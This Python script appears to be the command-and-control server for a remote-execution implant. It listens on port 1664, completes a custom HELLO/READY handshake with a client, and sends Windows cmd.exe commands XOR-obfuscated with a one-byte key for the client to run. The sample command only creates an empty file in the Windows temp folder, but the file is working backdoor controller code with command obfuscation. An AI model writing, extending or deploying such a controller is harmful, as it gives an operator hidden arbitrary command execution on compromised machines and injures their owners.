import socket
import time

# Command definitions matching the client
CMD_NULL = 0b0000
CMD_HELLO = 0b0001
CMD_READY = 0b0010
CMD_EXEC = 0b0100
CMD_EXIT = 0b1000

BUFFER_SIZE = 1024

def xor_cipher(data, key):
    return bytes([b ^ key for b in data])

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 1664))  # Bind to the same port as specified in the client
    server_socket.listen(1)

    print("Server listening on port 1664")
    
    conn, addr = server_socket.accept()
    print(f"Connected by {addr}")

    try:
        # Receive client's hello
        data = conn.recv(1)
        if data[0] != CMD_HELLO:
            print("Did not receive CMD_HELLO, exiting...")
            conn.close()
            server_socket.close()
            return

        print("Received CMD_HELLO from client")

        # Send server hello
        conn.sendall(bytes([CMD_HELLO]))
        print("Sent CMD_HELLO to client")

        while True:
            # Wait for client's ready signal
            data = conn.recv(1)
            if not data or data[0] != CMD_READY:
                print("Client is not ready, exiting...")
                break

            print("Received CMD_READY from client")

            # Send the ready signal back to the client
            conn.sendall(bytes([CMD_READY]))
            print("Sent CMD_READY to client")

            # Simulate sending a command (e.g., 'echo Hello, World!')
            command = 'cmd.exe /c copy /b NUL c:\\Windows\\temp\\test.txt\0'
            cipher_key = 0x01  # Example cipher key

            # Send the command to execute
            conn.sendall(bytes([CMD_EXEC]))
            print("Sent CMD_EXEC to client")

            # Send the cipher key
            conn.sendall(bytes([cipher_key]))
            print(f"Sent cipher key {cipher_key} to client")

            # Send the ciphered command
            ciphered_command = xor_cipher(command.encode('utf-8'), cipher_key)
            conn.sendall(ciphered_command)
            print(f"Sent ciphered command '{command}' to client")

            # # Receive the execution result from the client
            # result = conn.recv(BUFFER_SIZE)
            # print(f"Received command execution result: {result.decode('utf-8')}")

            # Optionally send the exit command
            conn.sendall(bytes([CMD_EXIT]))
            print("Sent CMD_EXIT to client")
            #break

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        print("Connection closed.")
        conn.close()
        server_socket.close()

if __name__ == "__main__":
    main()
